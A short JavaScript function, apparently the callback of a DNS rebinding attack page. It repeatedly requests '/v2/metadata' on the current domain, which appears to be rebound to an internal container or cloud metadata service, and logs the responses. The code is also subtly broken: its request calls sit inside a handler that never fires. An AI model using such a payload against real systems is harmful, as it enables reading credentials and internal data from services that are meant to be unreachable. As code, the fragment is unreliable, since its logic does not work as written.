function rebind_cb() {
  var meta;
  for(var i = 0; i < 600; ++i) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      path = 'http://' + document.domain + '/v2/metadata';
      xhr.open("GET",path,false);
      xhr.send();

      xhr.onload = function() {
        log(`Response: ${xhr.status}: ${xhr.response}`);
      }
    }
  }
}
